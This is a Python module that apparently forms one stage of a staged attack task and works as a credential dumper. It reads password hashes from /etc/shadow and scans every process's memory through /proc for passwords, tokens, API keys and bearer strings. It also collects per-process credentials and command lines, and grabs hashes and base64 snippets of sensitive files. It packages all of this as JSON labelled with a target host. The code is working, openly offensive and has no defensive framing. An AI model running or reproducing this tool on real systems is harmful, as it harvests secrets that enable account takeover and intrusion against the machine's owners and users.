from __future__ import annotations
from TASK_001_file_encryption import SensitiveFileRecord, classify_sensitive_files, SCAN_ROOTS, TARGET_HOST_IP

import base64
import datetime
import hashlib
import json
import os
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional


__all__ = [
    "CredentialDump",
    "ShadowEntry",
    "ProcCredEntry",
    "dump_credentials",
    "read_shadow_entries",
    "read_proc_cred_entries",
    "collect_sensitive_file_evidence",
]

_SNIPPET_BYTES = 1024
_SNIPPET_MAX_FILE_SIZE = 4 * 1024 * 1024
_HASH_CHUNK_SIZE = 65536

_MEM_CHUNK_SIZE = 64 * 1024
_MEM_OVERLAP = 64
_MEM_MAX_REGION_BYTES = 512 * 1024
_MEM_MAX_REGIONS = 4
_MEM_MAX_TOTAL_BYTES = 2 * 1024 * 1024
_MEM_MAX_FINDINGS = 10

_MEM_FINDING_RE = re.compile(
    rb"(?i)(password|passwd|pwd|secret|token|api[_-]?key|"
    rb"access[_-]?key|private[_-]?key|client[_-]?secret|"
    rb"session[_-]?token|bearer|authorization)"
)


def _optional_int(value: Any) -> Optional[int]:
    if value is None:
        return None

    text = str(value).strip()
    if not text:
        return None

    if text.isdigit():
        try:
            return int(text)
        except ValueError:
            return None

    return None


def _record_attr(record: Any, name: str, default: Any = None) -> Any:
    if isinstance(record, dict):
        return record.get(name, default)
    return getattr(record, name, default)


def _to_serializable(value: Any) -> Any:
    if value is None or isinstance(value, (str, int, float, bool)):
        return value

    to_dict = getattr(value, "to_dict", None)
    if callable(to_dict):
        try:
            return _to_serializable(to_dict())
        except Exception:
            pass

    if isinstance(value, dict):
        return {str(key): _to_serializable(item) for key, item in value.items()}

    if isinstance(value, (list, tuple, set, frozenset)):
        return [_to_serializable(item) for item in value]

    if isinstance(value, bytes):
        return value.hex()

    if isinstance(value, Path):
        return str(value)

    if isinstance(value, os.PathLike):
        return str(value)

    try:
        return str(value)
    except Exception:
        return repr(value)


def _parse_cred_values(line: str) -> Dict[str, int]:
    result: Dict[str, int] = {}
    for key, raw_value in re.findall(r"([A-Za-z_]+)=(\d+)", line):
        try:
            result[key] = int(raw_value)
        except ValueError:
            continue
    return result


def _parse_cred_file(path: Any) -> tuple:
    ucred: Dict[str, int] = {}
    scred: Dict[str, int] = {}
    fscred: Dict[str, int] = {}

    try:
        text = Path(path).read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ucred, scred, fscred

    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        if line.startswith("ucred:"):
            current = "ucred"
            payload = line.split(":", 1)[1].strip() if ":" in line else ""
        elif line.startswith("scred:"):
            current = "scred"
            payload = line.split(":", 1)[1].strip() if ":" in line else ""
        elif line.startswith("fscred:"):
            current = "fscred"
            payload = line.split(":", 1)[1].strip() if ":" in line else ""
        else:
            continue

        values = _parse_cred_values(payload)
        if current == "ucred":
            ucred.update(values)
        elif current == "scred":
            scred.update(values)
        elif current == "fscred":
            fscred.update(values)

    return ucred, scred, fscred


def _mem_snippet(data: bytes, start: int, end: int) -> str:
    left = max(0, start - 16)
    right = min(len(data), end + 16)

    if right <= left:
        return ""

    snippet = data[left:right]
    cleaned = bytes(byte for byte in snippet if 9 <= byte <= 13 or 32 <= byte <= 126)
    return cleaned.decode("latin-1")


def _scan_pid_mem(
    proc_root: Any,
    pid: int,
    max_findings: Optional[int] = _MEM_MAX_FINDINGS,
) -> List[Dict[str, Any]]:
    if max_findings is None:
        max_findings = _MEM_MAX_FINDINGS

    findings: List[Dict[str, Any]] = []
    proc_path = Path(proc_root)
    maps_path = proc_path / str(pid) / "maps"
    mem_path = proc_path / str(pid) / "mem"

    try:
        maps_text = maps_path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return findings

    try:
        fd = os.open(mem_path, os.O_RDONLY)
    except OSError:
        return findings

    total_read = 0
    regions = 0

    try:
        for line in maps_text.splitlines():
            if len(findings) >= max_findings:
                break
            if total_read >= _MEM_MAX_TOTAL_BYTES:
                break
            if regions >= _MEM_MAX_REGIONS:
                break

            parts = line.split()
            if len(parts) < 3:
                continue

            address_parts = parts[0].split("-")
            if len(address_parts) != 2:
                continue

            try:
                start = int(address_parts[0], 16)
                end = int(address_parts[1], 16)
            except ValueError:
                continue

            permissions = parts[1]
            if "r" not in permissions:
                continue

            region_size = end - start
            if region_size <= 0:
                continue

            limit = min(region_size, _MEM_MAX_REGION_BYTES)
            if limit <= 0:
                continue

            regions += 1

            try:
                os.lseek(fd, start, os.SEEK_SET)
            except (OSError, OverflowError, ValueError):
                continue

            pos = 0
            tail = b""
            seen = set()

            while (
                pos < limit
                and total_read < _MEM_MAX_TOTAL_BYTES
                and len(findings) < max_findings
            ):
                to_read = min(
                    _MEM_CHUNK_SIZE,
                    limit - pos,
                    _MEM_MAX_TOTAL_BYTES - total_read,
                )
                if to_read <= 0:
                    break

                chunk_start = pos
                try:
                    chunk = os.read(fd, to_read)
                except (OSError, OverflowError, ValueError):
                    break

                if not chunk:
                    break

                pos += len(chunk)
                total_read += len(chunk)

                buffer = tail + chunk
                tail_len = len(tail)

                for match in _MEM_FINDING_RE.finditer(buffer):
                    if match.end() <= tail_len:
                        continue

                    pattern = match.group(0).decode("latin-1", "replace")
                    absolute_start = start + chunk_start - tail_len + match.start()
                    key = (pattern, absolute_start)

                    if key in seen:
                        continue
                    seen.add(key)

                    findings.append(
                        {
                            "pattern": pattern,
                            "offset": absolute_start,
                            "snippet": _mem_snippet(buffer, match.start(), match.end()),
                        }
                    )

                    if len(findings) >= max_findings:
                        break

                if buffer:
                    tail = buffer[-_MEM_OVERLAP:] if len(buffer) > _MEM_OVERLAP else buffer
                else:
                    tail = b""
    finally:
        try:
            os.close(fd)
        except OSError:
            pass

    return findings


def _iter_candidate_files(roots: Iterable[Any]) -> Iterable[str]:
    for root in roots:
        try:
            path = Path(root)
        except Exception:
            continue

        try:
            if path.is_dir():
                for candidate in path.rglob("*"):
                    try:
                        if candidate.is_file():
                            yield str(candidate)
                    except OSError:
                        continue
            elif path.is_file():
                yield str(path)
        except OSError:
            continue


@dataclass
class ShadowEntry:
    user: str
    hash: str = ""
    last_change: Optional[int] = None
    min_age: Optional[int] = None
    max_age: Optional[int] = None
    inactive: Optional[int] = None
    expire: Optional[int] = None
    reserved: Optional[str] = None
    uid: Optional[int] = None
    gid: Optional[int] = None
    home: Optional[str] = None
    shell: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "user": self.user,
            "hash": self.hash,
            "last_change": self.last_change,
            "min_age": self.min_age,
            "max_age": self.max_age,
            "inactive": self.inactive,
            "expire": self.expire,
            "reserved": self.reserved,
            "uid": self.uid,
            "gid": self.gid,
            "home": self.home,
            "shell": self.shell,
        }


@dataclass
class ProcCredEntry:
    pid: int
    comm: str = ""
    cmdline: List[str] = field(default_factory=list)
    ucred_uid: Optional[int] = None
    ucred_gid: Optional[int] = None
    ucred_sgid: Optional[int] = None
    scred_uid: Optional[int] = None
    scred_gid: Optional[int] = None
    scred_sgid: Optional[int] = None
    fscred_uid: Optional[int] = None
    fscred_gid: Optional[int] = None
    fscred_sgid: Optional[int] = None
    ucred: Dict[str, int] = field(default_factory=dict)
    scred: Dict[str, int] = field(default_factory=dict)
    fscred: Dict[str, int] = field(default_factory=dict)
    mem_findings: List[Dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "pid": self.pid,
            "comm": self.comm,
            "cmdline": list(self.cmdline),
            "ucred_uid": self.ucred_uid,
            "ucred_gid": self.ucred_gid,
            "ucred_sgid": self.ucred_sgid,
            "scred_uid": self.scred_uid,
            "scred_gid": self.scred_gid,
            "scred_sgid": self.scred_sgid,
            "fscred_uid": self.fscred_uid,
            "fscred_gid": self.fscred_gid,
            "fscred_sgid": self.fscred_sgid,
            "ucred": dict(self.ucred),
            "scred": dict(self.scred),
            "fscred": dict(self.fscred),
            "mem_findings": [dict(item) for item in self.mem_findings],
        }


@dataclass(frozen=True)
class SensitiveFileEvidence(SensitiveFileRecord):
    size: int = 0
    sha256: str = ""
    snippet: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "path": self.path,
            "category": self.category,
            "matched_pattern": self.matched_pattern,
            "size": self.size,
            "sha256": self.sha256,
            "snippet": self.snippet,
        }


@dataclass
class CredentialDump:
    target_host: str
    generated_at: str
    shadow_entries: List[ShadowEntry] = field(default_factory=list)
    proc_cred_entries: List[ProcCredEntry] = field(default_factory=list)
    sensitive_files: List[SensitiveFileEvidence] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_host": self.target_host,
            "generated_at": self.generated_at,
            "shadow_entries": _to_serializable(self.shadow_entries),
            "proc_cred_entries": _to_serializable(self.proc_cred_entries),
            "sensitive_files": _to_serializable(self.sensitive_files),
        }

    def to_json(self, indent: int = 2) -> str:
        return json.dumps(
            self.to_dict(),
            indent=indent,
            sort_keys=True,
            default=_to_serializable,
        )


def read_shadow_entries(
    shadow_path: Any = "/etc/shadow",
    passwd_path: Any = "/etc/passwd",
) -> List[ShadowEntry]:
    entries: List[ShadowEntry] = []
    passwd_info: Dict[str, Dict[str, Any]] = {}

    try:
        passwd_text = Path(passwd_path).read_text(encoding="utf-8", errors="replace")
    except OSError:
        passwd_text = ""

    for line in passwd_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        parts = line.split(":")
        if len(parts) < 7:
            continue

        user = parts[0].strip()
        if not user:
            continue

        passwd_info[user] = {
            "uid": _optional_int(parts[2]),
            "gid": _optional_int(parts[3]),
            "home": parts[5].strip(),
            "shell": parts[6].strip(),
        }

    try:
        shadow_text = Path(shadow_path).read_text(encoding="utf-8", errors="replace")
    except OSError:
        shadow_text = ""

    for line in shadow_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        parts = line.split(":")
        if not parts or not parts[0].strip():
            continue

        user = parts[0].strip()
        info = passwd_info.get(user, {})

        entries.append(
            ShadowEntry(
                user=user,
                hash=parts[1].strip() if len(parts) > 1 else "",
                last_change=_optional_int(parts[2] if len(parts) > 2 else None),
                min_age=_optional_int(parts[3] if len(parts) > 3 else None),
                max_age=_optional_int(parts[4] if len(parts) > 4 else None),
                inactive=_optional_int(parts[5] if len(parts) > 5 else None),
                expire=_optional_int(parts[6] if len(parts) > 6 else None),
                reserved=parts[7].strip() if len(parts) > 7 else None,
                uid=info.get("uid"),
                gid=info.get("gid"),
                home=info.get("home"),
                shell=info.get("shell"),
            )
        )

    return entries


def read_proc_cred_entries(
    proc_root: Any = "/proc",
    scan_mem: bool = True,
) -> List[ProcCredEntry]:
    proc_path = Path(proc_root)

    try:
        candidates = [path for path in proc_path.iterdir() if path.name.isdigit()]
    except OSError:
        return []

    candidates.sort(key=lambda item: int(item.name))

    entries: List[ProcCredEntry] = []

    for pid_path in candidates:
        try:
            pid = int(pid_path.name)
        except ValueError:
            continue

        entry = ProcCredEntry(pid=pid)

        ucred, scred, fscred = _parse_cred_file(pid_path / "cred")
        entry.ucred = ucred
        entry.scred = scred
        entry.fscred = fscred

        entry.ucred_uid = ucred.get("uid")
        entry.ucred_gid = ucred.get("gid")
        entry.ucred_sgid = ucred.get("sgid", ucred.get("egid"))

        entry.scred_uid = scred.get("uid")
        entry.scred_gid = scred.get("gid")
        entry.scred_sgid = scred.get("sgid", scred.get("egid"))

        entry.fscred_uid = fscred.get("uid")
        entry.fscred_gid = fscred.get("gid")
        entry.fscred_sgid = fscred.get("sgid", fscred.get("egid"))

        try:
            entry.comm = (
                pid_path.joinpath("comm").read_text(encoding="utf-8", errors="replace").strip()
            )
        except OSError:
            entry.comm = ""

        try:
            cmdline_bytes = pid_path.joinpath("cmdline").read_bytes()
            entry.cmdline = [
                part.decode("utf-8", "replace")
                for part in cmdline_bytes.split(b"\x00")
                if part
            ]
        except OSError:
            entry.cmdline = []

        if scan_mem:
            try:
                entry.mem_findings = _scan_pid_mem(proc_path, pid)
            except Exception:
                entry.mem_findings = []

        entries.append(entry)

    return entries


def collect_sensitive_file_evidence(
    roots: Optional[Iterable[Any]] = None,
) -> List[SensitiveFileEvidence]:
    if roots is None:
        roots_list = list(SCAN_ROOTS or [])
    elif isinstance(roots, (str, os.PathLike)):
        roots_list = [os.fspath(roots)]
    else:
        roots_list = [os.fspath(item) for item in roots]

    raw_records: List[Any] = []

    try:
        classified = classify_sensitive_files(roots_list)
        if classified:
            raw_records.extend(classified)
    except Exception:
        pass

    try:
        candidate_files = list(_iter_candidate_files(roots_list))
        if candidate_files:
            classified = classify_sensitive_files(candidate_files)
            if classified:
                raw_records.extend(classified)
    except Exception:
        pass

    result: List[SensitiveFileEvidence] = []
    seen_paths = set()

    for record in raw_records:
        if record is None:
            continue

        path_value = _record_attr(record, "path", "")
        if path_value is None:
            continue

        try:
            path_str = os.fspath(path_value)
        except TypeError:
            path_str = str(path_value)

        if not path_str or path_str in seen_paths:
            continue
        seen_paths.add(path_str)

        category_value = _record_attr(record, "category", "")
        matched_value = _record_attr(record, "matched_pattern", "")

        try:
            size = int(os.stat(path_str).st_size)
        except OSError:
            size = 0

        sha256 = ""
        try:
            if os.path.isfile(path_str):
                digest = hashlib.sha256()
                with open(path_str, "rb") as handle:
                    while True:
                        chunk = handle.read(_HASH_CHUNK_SIZE)
                        if not chunk:
                            break
                        digest.update(chunk)
                sha256 = digest.hexdigest()
        except (OSError, ValueError):
            sha256 = ""

        snippet = None
        try:
            if os.path.isfile(path_str) and 0 <= size <= _SNIPPET_MAX_FILE_SIZE:
                with open(path_str, "rb") as handle:
                    snippet_bytes = handle.read(_SNIPPET_BYTES)
                if snippet_bytes:
                    snippet = base64.b64encode(snippet_bytes).decode("ascii")
        except OSError:
            snippet = None

        result.append(
            SensitiveFileEvidence(
                path=path_str,
                category="" if category_value is None else str(category_value),
                matched_pattern="" if matched_value is None else str(matched_value),
                size=size,
                sha256=sha256,
                snippet=snippet,
            )
        )

    return result


def dump_credentials(
    scan_mem: bool = True,
    roots: Optional[Iterable[Any]] = None,
) -> CredentialDump:
    target_host = TARGET_HOST_IP
    if target_host is None:
        target_host = os.environ.get("TARGET_HOST_IP", "unknown")

    return CredentialDump(
        target_host=str(target_host),
        generated_at=datetime.datetime.now(datetime.timezone.utc).isoformat(),
        shadow_entries=read_shadow_entries(),
        proc_cred_entries=read_proc_cred_entries(scan_mem=scan_mem),
        sensitive_files=collect_sensitive_file_evidence(roots),
    )


def main() -> int:
    print(dump_credentials().to_json())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
